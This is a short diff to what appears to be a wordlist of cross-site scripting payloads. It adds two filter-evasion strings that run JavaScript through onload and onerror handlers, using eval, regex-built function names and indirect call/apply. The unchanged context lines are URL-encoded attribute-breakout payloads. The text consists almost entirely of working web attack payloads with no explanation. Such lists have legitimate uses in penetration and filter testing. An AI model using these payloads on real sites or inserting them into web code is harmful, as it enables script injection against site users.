@@ -48,3 +48,8 @@ test%22onmouseover=alert(1)/%26sol;
 %22onmouseover%3DInputBox%2b1%20language%3D%22vbs
 
 %22%2fonload%20%3D%20%21-alert%26%23x28%3B1%26%23x29%3B
+
+"onload=action=/confir/.source+'m';eval(action)(1);//
+
+"onerror=a[alert];a[0].call(a[1],1) or onerror=a[alert];a[0].apply(a[1],[1])
+
